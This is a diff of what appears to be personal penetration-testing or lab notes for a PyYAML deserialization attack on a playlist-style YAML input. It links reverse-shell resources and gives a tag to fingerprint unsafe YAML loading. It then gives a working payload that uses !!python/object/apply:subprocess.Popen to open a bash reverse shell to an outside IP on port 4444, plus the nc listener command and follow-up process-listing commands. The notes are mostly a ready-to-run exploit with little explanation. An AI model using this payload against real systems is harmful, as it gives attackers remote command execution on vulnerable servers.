@@ -3,7 +3,12 @@
 https://github.com/brightio/penelope
 ```
 
-##Fingerprint PyYAML object support
+##reverse shell website:
+```
+https://www.revshells.com/
+```
+
+##1. Fingerprint PyYAML object support
 ```
 playlist:
   name: !!python/tuple [Sunset, Session]
@@ -33,13 +38,14 @@ playlist:
   tracks:
     - artist: Khruangbin
       title: Maria Tambien      
- ```     
+ ```
+    
 ##shell      
 ```      
 playlist:
   name: !!python/object/apply:subprocess.Popen
     args:
-      - ["/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.129.139/4444 0>&1"]
+      - ["/bin/bash", "-c", "bash -i >& /dev/tcp/192.168.173.121/4444 0>&1"]
   vibe: golden hour
   tracks:
     - artist: Khruangbin
@@ -54,6 +60,14 @@ ps aux
 ```
 ps -eo user,pid,ppid,args --forest
 ```
+
+#Using nc 
+```
+nc -nlvp 4444
+
+```
+
+##Optional
 ```
 systemctl status 609
 ```
